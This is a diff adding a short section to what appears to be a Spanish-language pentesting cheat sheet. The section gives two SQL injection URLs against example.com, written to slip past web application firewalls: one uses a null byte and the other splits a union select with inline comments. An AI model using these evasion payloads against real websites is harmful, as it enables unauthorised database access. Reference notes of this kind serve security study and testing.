@@ -2396,7 +2396,19 @@ Para entablar una reverse shell, ya simplemente dependerá de la metodología qu
 
 ##### WAF SQL Injection Bypass WAF Techniques
 
+**1. Null Bytes**
 
+Para elaborar una inyección **Null Byte**:
+
+```bash
+http://example.com/news.php?id=1+%00’union+select+1,2,3′–
+```
+
+Consultas a través de **SQL Comments**:
+
+```bash
+http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3–
+```
 
 ### Pentesting Linux
 
